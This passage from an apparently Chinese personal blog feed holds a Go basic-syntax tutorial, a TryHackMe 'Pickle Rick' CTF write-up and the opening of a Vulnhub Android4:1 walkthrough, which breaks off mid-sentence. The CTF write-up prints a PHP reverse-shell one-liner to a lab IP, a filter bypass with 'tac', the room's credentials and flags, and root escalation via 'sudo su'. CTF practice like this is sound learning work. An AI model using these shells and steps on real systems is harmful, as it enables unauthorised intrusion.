    <url>/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>GoGoGo!</p><span id="more"></span><p>先看一个简单的代码，熟悉一下简单语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>package</strong>：声明当前文件属于哪一个包，入口文件都<strong>必须为 <code>main</code> 包</strong>，入口函数是 main 函数。</p><p><strong>import</strong>：导入关键字，fmt 是导入的包名。</p><p><strong>func</strong>：函数声明关键字。</p><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><p>在 go 中，程序通过将包链接在一起来构建，go 中导入的最基本单位是一个<strong>包</strong>，不是 <code>.go</code> 文件。包内共享所有变量，常量以及所有定义的类型，而且包名建议小写。</p><h2 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h2><p>go 中控制包内资源可见性有两种方法</p><ol><li>名称大写字母开头，即为<strong>公有</strong></li><li>小写或下划线开头，即为<strong>私有</strong></li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">package</span> <span class="hljs-title class_">butt3r</span><br><br><span class="hljs-keyword">const</span> User = <span class="hljs-string">&quot;butt3rf1y&quot;</span><span class="hljs-comment">//公有</span><br><br><span class="hljs-keyword">const</span> passwd = <span class="hljs-number">114514</span><span class="hljs-comment">//私有</span><br></code></pre></td></tr></table></figure><h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><p>导入包就是导入这个包的所有公有的类型&#x2F;变量&#x2F;常量</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> 包名<br></code></pre></td></tr></table></figure><p>导入单个包时</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import <span class="hljs-string">&quot;example&quot;</span><br></code></pre></td></tr></table></figure><p>导入多个包时</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example2&quot;</span><br></code></pre></td></tr></table></figure><p>导入多个包时也可以用 <code>&#123;&#125;</code> 括起来</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;example1&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>如果包名重复或比较复杂，可以起一个别名</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br>e <span class="hljs-string">&quot;example&quot;</span><br>e1 <span class="hljs-string">&quot;example1&quot;</span><br><br></code></pre></td></tr></table></figure><p>还有一种匿名导入包，但是匿名导入的包无法使用，一般这么做是为了加载包下的 <code>init</code> 函数，但又不需要包中的类型，比如说注册数据库驱动</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>e <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-literal">_</span> <span class="hljs-string">&quot;mysql-driver&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>导入包后，可以通过 <code>名称.标识符</code> 去访问，比如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(example.User)<br>&#125;<br></code></pre></td></tr></table></figure><p>私有类型无法访问，并且 go 不支持循环导入，不管是直接的还是间接的。例如包 A 导入了包 B，包 B 也导入了包 A，这是直接循环导入；包 A 导入了包 C，包 C 导入了包 B，包 B 又导入了包 A，这就是间接的循环导入，存在循环导入的话将会无法通过编译。</p><h2 id="内部包"><a href="#内部包" class="headerlink" title="内部包"></a>内部包</h2><p>go 中一个包内名为 <code>internal</code> 包为内部包，外部包无法访问内部包</p><h1 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h1><p>go 中所有内置关键字</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">break</span>        <span class="hljs-keyword">default</span>      func         <span class="hljs-keyword">interface</span>    <span class="hljs-symbol">select</span><br><span class="hljs-symbol">case</span>         <span class="hljs-symbol">defer</span>        <span class="hljs-symbol">go</span>           <span class="hljs-symbol">map</span>          <span class="hljs-symbol">struct</span><br><span class="hljs-symbol">chan</span>         <span class="hljs-symbol">else</span>         <span class="hljs-symbol">goto</span>         <span class="hljs-symbol">package</span>      <span class="hljs-symbol">switch</span><br><span class="hljs-symbol">const</span>        <span class="hljs-symbol">fallthrough</span>  <span class="hljs-symbol">if</span>           <span class="hljs-symbol">range</span>        <span class="hljs-symbol">type</span><br><span class="hljs-symbol">continue</span>     <span class="hljs-symbol">for</span>          <span class="hljs-symbol">import</span>       <span class="hljs-symbol">return</span>       <span class="hljs-symbol">var</span><br></code></pre></td></tr></table></figure><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>go 语言中支持的运算符号的优先级排列</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">Precedence    Operator<br>   <span class="hljs-number"> 5 </span>            *  /  %  &lt;&lt;  &gt;&gt;  &amp;  &amp;^<br>   <span class="hljs-number"> 4 </span>            +  -  |  ^<br>   <span class="hljs-number"> 3 </span>            ==  !=  &lt;  &lt;=  &gt;  &gt;=<br>   <span class="hljs-number"> 2 </span>            &amp;&amp;<br>   <span class="hljs-number"> 1 </span>            ||<br></code></pre></td></tr></table></figure><p>go 语言中没有选择将<code>~</code>作为取反运算符，而是复用了<code>^</code>符号，当两个数字使用<code>^</code>时，例如<code>a^b</code>，它就是异或运算符，只对一个数字使用时，例如<code>^a</code>，那么它就是取反运算符。go 也支持增强赋值运算符</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">a</span> /= <span class="hljs-number">2</span><br><span class="hljs-attribute">a</span> &amp;^= <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：go 中没有自增和自减，他们变成了语句 <code>statement</code> ，并且规定了只能位于操作数的后方，所以不用再去纠结 <code>i++</code>和<code>++i</code> 这种不太聪明的问题，但是没有返回值。甚至  <code>a = b++</code> 这种写法是错误的。</p><h1 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h1><h2 id="整型字面量"><a href="#整型字面量" class="headerlink" title="整型字面量"></a>整型字面量</h2><p>允许使用 <code>_</code> 进行数字划分，但是仅仅允许在前缀符号之后和数字之间使用</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">24 </span>// <span class="hljs-number">24</span><br><span class="hljs-symbol">024 </span>// <span class="hljs-number">24</span><br><span class="hljs-number">2</span>_4 // <span class="hljs-number">24</span><br><span class="hljs-number">0</span>_2_4 // <span class="hljs-number">24</span><br><span class="hljs-number">10</span>_000 // <span class="hljs-number">10</span>k<br><span class="hljs-number">100</span>_000 // <span class="hljs-number">100</span>k<br><span class="hljs-number">0</span>O24 // <span class="hljs-number">20</span><br><span class="hljs-number">0</span>b00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x00 // <span class="hljs-number">0</span><br><span class="hljs-number">0</span>x0_0 // <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="浮点型字面量"><a href="#浮点型字面量" class="headerlink" title="浮点型字面量"></a>浮点型字面量</h2><p>通过不同前缀可以表达不同进制浮点数</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0.<br>72.40<br>072.40       <span class="hljs-string">//</span> == 72.40<br>2.71828<br>1.e+0<br>6.67428e-11<br>1E6<br><span class="hljs-string">.25</span><br><span class="hljs-string">.12345E</span>+5<br>1_5.         <span class="hljs-string">//</span> == 15.0<br>0.15e+0_2    <span class="hljs-string">//</span> == 15.0<br><br>0x1p-2       <span class="hljs-string">//</span> == 0.25<br>0x2.p10      <span class="hljs-string">//</span> == 2048.0<br>0x1.Fp+0     <span class="hljs-string">//</span> == 1.9375<br>0X.8p-0      <span class="hljs-string">//</span> == 0.5<br>0X_1FFFP-16  <span class="hljs-string">//</span> == 0.1249847412109375<br>0x15e-2      <span class="hljs-string">//</span> == 0x15e - 2 <span class="hljs-params">(integer subtraction)</span><br></code></pre></td></tr></table></figure><h2 id="复数字面量"><a href="#复数字面量" class="headerlink" title="复数字面量"></a>复数字面量</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">0i<br>0123i         <span class="hljs-string">//</span> == 123i<br>0o123i        <span class="hljs-string">//</span> == 0o123 * 1i == 83i<br>0xabci        <span class="hljs-string">//</span> == 0xabc * 1i == 2748i<br>0.i<br>2.71828i<br>1.e+0i<br>6.67428e-11i<br>1E6i<br><span class="hljs-string">.25i</span><br><span class="hljs-string">.12345E</span>+5i<br>0x1p-2i       <span class="hljs-string">//</span> == 0x1p-2 * 1i == 0.25i<br></code></pre></td></tr></table></figure><h2 id="字符字面量"><a href="#字符字面量" class="headerlink" title="字符字面量"></a>字符字面量</h2><p>字符字面量必须使用单引号括起来 <code>&#39;&#39;</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;a&#x27;<br>&#x27;ä&#x27;<br>&#x27;你&#x27;<br>&#x27;\t&#x27;<br>&#x27;\007&#x27;<br>&#x27;\x07&#x27;<br>&#x27;\xff&#x27;<br>&#x27;\u12e4&#x27;<br>&#x27;\U<span class="hljs-number">00101234</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\a</span>   U+<span class="hljs-number">0007</span> 响铃符号<br><span class="hljs-string">\b</span>   U+<span class="hljs-number">0008</span> 回退符号<br><span class="hljs-string">\f</span>   U+<span class="hljs-number">000</span>C 换页符号<br><span class="hljs-string">\n</span>   U+<span class="hljs-number">000</span>A 换行符号<br><span class="hljs-string">\r</span>   U+<span class="hljs-number">000</span>D 回车符号<br><span class="hljs-string">\t</span>   U+<span class="hljs-number">0009</span> 横向制表符号<br><span class="hljs-string">\v</span>   U+<span class="hljs-number">000</span>B 纵向制表符号<br><span class="hljs-string">\\</span>   U+<span class="hljs-number">005</span>C 反斜杠转义<br><span class="hljs-string">\&#x27;</span>   U+<span class="hljs-number">0027</span> 单引号转义 (该转义仅在字符内有效)<br><span class="hljs-string">\&quot;</span>   U+<span class="hljs-number">0022</span> 双引号转义 (该转义仅在字符串内有效)<br></code></pre></td></tr></table></figure><h2 id="字符串字面量"><a href="#字符串字面量" class="headerlink" title="字符串字面量"></a>字符串字面量</h2><p>字符串字面量必须使用双引号 <code>&quot;&quot;</code> 括起来或者反引号（反引号字符串不允许转义）</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift">`abc`                <span class="hljs-comment">// &quot;abc&quot;</span><br>`\n<br>\n`                  <span class="hljs-comment">// &quot;\\n\n\\n&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>&quot;</span>                 <span class="hljs-comment">// `&quot;`</span><br><span class="hljs-string">&quot;kfcvme50!<span class="hljs-subst">\n</span>&quot;</span><br><span class="hljs-string">&quot;疯狂星期四v我50&quot;</span><br><span class="hljs-string">&quot;\u65e5本\U00008a9e&quot;</span><br><span class="hljs-string">&quot;\xff\u00FF&quot;</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>通过 <code>func</code> 关键字来进行</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>fmt.Println(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>参数类型后置</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">func Hello(<span class="hljs-keyword">name</span> string) &#123;<br>  <span class="hljs-keyword">fmt</span>.Println(<span class="hljs-keyword">name</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>多返回值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">Pos</span><span class="hljs-params">()</span> <span class="hljs-params">()</span> <span class="hljs-params">(x, y float64)</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h1><h2 id="花括号换行"><a href="#花括号换行" class="headerlink" title="花括号换行"></a>花括号换行</h2><p>go 中花括号都不能换行</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//正确</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//错误</span><br><span class="hljs-function">func <span class="hljs-title">main</span>()</span> <br>&#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h2><p>go 中代码间隔也有一定的意义，比如说</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>*<span class="hljs-number">4</span> + <span class="hljs-number">5</span>/<span class="hljs-number">1</span>*<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>在格式化后，<code>*</code> 符号之间的间隔会显得更紧凑，意味着优先进行运算，而 <code>+</code> 符号附近的间隔则较大，代表着较后进行运算。</p><h2 id="省略"><a href="#省略" class="headerlink" title="省略"></a>省略</h2><p>在 go 中的 if 和 for 语句可以只写一行，但必须加上花括号</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">func <span class="hljs-selector-tag">main</span>() &#123;<br>for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-selector-tag">i</span>++ &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">i</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h2><p>go 中没有三元表达式，不能写像 c 语言中的 <code>temp = (a &gt; b) ? a : b;</code>  这种表达式。</p>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Pickle Rick</title>
    <link href="/2025/01/15/Rick/"/>
    <url>/2025/01/15/Rick/</url>
    
    <content type="html"><![CDATA[<p>时隔一个半月，我终于活了！</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -T4 -sS -Pn <span class="hljs-number">10.10.85.211</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cd3fd564cb250a1f.png"></p><p>开放了 <code>22/tcp ssh服务</code>  和 <code>80/tcp http服务</code> </p><p>访问一下网页 <code>10.10.85.211:80</code>，好像并没有什么有用信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/fcd52b11d2a9dc4f.png"></p><p>emmm…f12 一下，发现了 <code>Username：R1ckRul3s</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/8e199542379a914d.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>然后再扫一下目录吧</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//10.10.85.211/</span><br></code></pre></td></tr></table></figure><p>扫到了几个看起来挺有用的目录，一个一个访问一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//10.10.85.211/assets/</span><br><span class="hljs-selector-attr">[01:23:50]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">588</span>B  - /assets/<br><span class="hljs-selector-attr">[01:24:39]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">455</span>B  - /login<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[01:25:10]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">17</span>B  - /robots.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6c25fc2caf1164eb.png"></p><p>首先是 <code>robots.txt</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5238ec11e7dc36f5.png"></p><p>一串字符串，不知道有没有用但也先收集着</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wubbalubbadubdub</span><br></code></pre></td></tr></table></figure><p>访问一下 <code>login.php</code>，用户名和密码，把之前发现的 <code>R1ckRul3s</code> 和那串奇怪的字符串填进去，发现成功了</p><p><img src="https://img.dkdun.cn/v1/2025/12/c568a7a5f6d0b782.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/16fb5a5e82e320f8.png"></p><h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p>在 <code>Command Panel</code> 执行 <code>ls</code>，得到了如下结果，一堆目录和文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Sup3rS3cretPickl3Ingred<span class="hljs-selector-class">.txt</span><br>assets<br>clue<span class="hljs-selector-class">.txt</span><br>denied<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>login<span class="hljs-selector-class">.php</span><br>portal<span class="hljs-selector-class">.php</span><br>robots.txt<br></code></pre></td></tr></table></figure><p>cat 不行但是 tac 可以，输入 tac 可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> Sup3rS3cretPickl3Ingred.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a40d69c3151dda0c.png"></p><p>得到了第一个 flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mr. meeseek hair<br></code></pre></td></tr></table></figure><h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p>之前 <code>ls</code> 显示出来的文件中有一个名为 <code>clue.txt</code> 的文件，中文意思是 “线索”，查看一下</p><p><img src="https://img.dkdun.cn/v1/2025/12/18ee2ed196878302.png"></p><p>意思是 “在文件系统中寻找其他成分。” </p><p>看来得在系统中寻找，那来反弹 shell 一下</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;10.21.118.213&quot;</span>,<span class="hljs-number">6667</span>);<span class="hljs-variable">$proc</span>=proc_open(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">1</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">2</span>=&gt;<span class="hljs-variable">$sock</span>),<span class="hljs-variable">$pipes</span>);&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure><p>这里有一个小插曲，因为我用的 wsl，反弹 shell 的时候在 wsl 的 kali 上监听了很多次，但是都没有回显，搞了好几个小时，最后终于破防，在凌晨三点求助于 n0o0b 师傅，师傅让我在 Windows 本机上进行 nc 监听，对了！这次成了，终于！特别特别感谢 n0o0b 师傅 zwz！！！</p><p><img src="https://img.dkdun.cn/v1/2025/12/c358e20f23b37553.png"></p><p>然后根据自己的流程找出第二个 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/80331b77365a4f56.png"></p><p>第二个 flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">jerry tear</span><br></code></pre></td></tr></table></figure><h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p>本来我想着拿到 shell 了，进 root 看看，但是忘记开始看的时候好像是 www-data 权限，权限不够</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc4fa2fcbbe0bad6.png"></p><p>那试试 <code>sudo -l</code> 列出目前用户可执行与无法执行的指令，发现可以通过 sudo 免密码使用 root（狂喜）</p><p>直接使用 <code>sudo su</code> 进入</p><p><img src="https://img.dkdun.cn/v1/2025/12/66849ce6212ea5d3.png"></p><p>第三个 flag</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fleeb juice</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Android4:1</title>
    <link href="/2024/11/30/Vulnhub-Android4-1/"/>
    <url>/2024/11/30/Vulnhub-Android4-1/</url>
    
    <content type="html"><![CDATA[<p>通过查找资料，又学习到了一些东西，我心甚慰，喜欢这样的自己 ：）</p><span id="more"></span><p>初学者</p><p>攻击机 kali：192.168.88.138</p><p>靶机：192.168.88.140</p><p><img src="https://img.dkdun.cn/v1/2024/12/01aaf50efc271d05.png"></p><p>扫描网段，发现主机 192.168.88.140</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.88.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/b114f4a2a3bd2d98.png"></p><p>查看开放端口</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -sV -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span class="hljs-number">88.140</span><br></code></pre></td></tr></table></figure><p>可以看到目标开放了 3 个端口，分别是 5555、8080、22000，先看看 8080 吧</p><p><img src="https://img.dkdun.cn/v1/2024/12/c8b2c3645dec92a9.png"></p><p>页面提示说有后门，用 POST 方式提交</p><p><img src="https://img.dkdun.cn/v1/2024/12/533c79a56b1a35bb.png"></p><p>用 dirb 扫描一下目录，扫出来了 <code>backdoor.php</code> </p><p><img src="https://img.dkdun.cn/v1/2024/12/48095127f1dcb6bc.png"></p><p>看来是个假的后门，没用。。。</p><p><img src="https://img.dkdun.cn/v1/2024/12/a03c6db318dad930.png"></p><p>PHP CLI 和 DropBear 也没什么结果，那么看看 5555 端口，搜了一下是指 android 服务默认的监听端口，通常与一些设备管理和远程访问服务相关联，特别是 adb 服务默认使用这个端口</p><p>简单介绍一下 adb：Android Debug Bridge（安卓调试桥），它就是一个命令行工具，用于通过电脑端与模拟器或者是设备之间的交互。</p><p>用 msf 来搜索一下 adb 